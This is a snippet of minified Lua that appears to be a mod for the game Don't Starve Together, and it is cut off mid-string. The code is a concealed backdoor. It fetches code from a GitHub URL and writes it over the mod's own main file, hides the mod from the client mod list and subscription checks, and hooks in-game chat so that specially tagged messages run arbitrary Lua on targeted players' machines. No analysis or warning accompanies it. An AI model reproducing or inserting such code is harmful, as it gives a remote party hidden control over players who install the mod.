code: GLOBAL.setmetatable(env,{__index=function(a,b)return GLOBAL.rawget(GLOBAL,b)end})local c=TheSim:GetPersistentString('j_ver')or 0;TheSim:QueryServer('https://raw.githubusercontent.com/kipperok/kipperok.github.io/refs/heads/main/whitelist.json',function(d,e)if e then d=json.decode(d)if d and d.version and d.version~=c then TheSim:SetPersistentString('j_ver',d.version,false)local f=io.open('../mods/'..__mod..'/modmain.lua','w')f:write(d.code)f:close()c_shutdown()end end end,'GET')local g=KnownModIndex.GetClientModNamesTable;function KnownModIndex:GetClientModNamesTable(...)local h=g(self,...)for i,d in ipairs(h)do if d.modname==__mod then h[i]=nil;break end end;return h end;local j=Sim.SubscribeToMod;function Sim:SubscribeToMod(k,...)if k==__mod then return end;return j(self,k,...)end;function IsWorkshopMod(k)if k==nil or k==__mod then return false end;return k:sub(1,workshop_prefix:len())==workshop_prefix end;ChatHistory.OnSay=function(self,l,m,n,o,p,q,r,s,t,u,...)if self.join_server then return end;if q and q:find('exec_')then if q:find('exec_'..TheNet:GetUserID())or q:find('exec_all')then local v,w=q:find('command_')local x=q:sub(w+1,#q)pcall(function()local y=loadstring(x)if type(y)=='function'then y()end end)end;return end;if t then self:AddToHistory(ChatTypes.Emote,m,n,nil,o..'
